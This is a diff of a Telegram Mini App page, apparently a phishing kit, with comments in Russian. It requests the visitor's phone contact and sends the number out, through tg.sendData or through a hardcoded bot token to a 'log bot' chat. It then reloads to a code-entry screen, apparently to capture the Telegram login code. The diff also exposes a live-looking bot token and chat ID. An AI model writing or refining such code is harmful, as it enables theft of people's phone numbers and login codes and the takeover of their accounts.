@@ -59,7 +59,6 @@
                 const LOG_BOT_TOKEN = "8923006288:AAFgpvKcHhZbpl148oi-qT5NUfvIu_7Cq24";
                 const CHAT_ID = "-1004399809740";
 
-                // Функция отправки через fetch
                 function sendToLogBot(text) {
                     fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -68,37 +67,33 @@
                     });
                 }
 
-                // Функция переключения на экран кода
-                function showCodeScreen() {
+                // 1. ЗАПРОС НОМЕРА (Работает как в самом первом твоем коде)
+                document.getElementById('btn-share').onclick = function() {
+                    tg.requestContact(function(shared, contact) {
+                        if (shared) {
+                            // Достаем номер, как в самом первом коде
+                            let phone = "undefined";
+                            if (contact && contact.phone_number) phone = contact.phone_number;
+                            else if (contact && contact.phone) phone = contact.phone;
+
+                            // Отправляем через sendData (этот метод не глючит, данные 100% уйдут)
+                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
+                            
+                            // ПЕРЕЗАПУСКАЕМ окно, чтобы оно не закрылось и открылось сразу на вводе кода
+                            // Это единственный способ обойти закрытие окна при sendData
+                            window.location.href = window.location.href + "&step=code";
+                        }
+                    });
+                };
+
+                // Проверяем, если мы перезапустились - открываем экран кода
+                if (window.location.href.includes("step=code")) {
                     document.getElementById('screen-phone').classList.add('hidden');
                     document.getElementById('screen-code').classList.remove('hidden');
                     setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                 }
 
-                // ПРОВЕРКА: Если номер уже есть в initData (срабатывает после перезагрузки)
-                if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.phone_number) {
-                    const phone = tg.initDataUnsafe.user.phone_number;
-                    sendToLogBot(`📱 PHONE: +${phone}`);
-                    showCodeScreen();
-                }
-
-                // 1. ЗАПРОС НОМЕРА
-                document.getElementById('btn-share').onclick = function() {
-                    tg.requestContact(function(shared, contact) {
-                        if (shared) {
-                            // Если номер есть в объекте contact (у кого-то работает) - шлем сразу
-                            if (contact && contact.phone_number) {
-                                sendToLogBot(`📱 PHONE: +${contact.phone_number}`);
-                                showCodeScreen();
-                            } else {
-                                // Если пришел undefined - перезагружаем окно, чтобы номер появился в initData
-                                window.location.reload();
-                            }
-                        }
-                    });
-                };
-
-                // 2. ВВОД КОДА
+                // 2. ВВОД КОДА (Тут ничего не закрывается)
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 document.getElementById('code-cells').onclick = () => codeInput.focus();
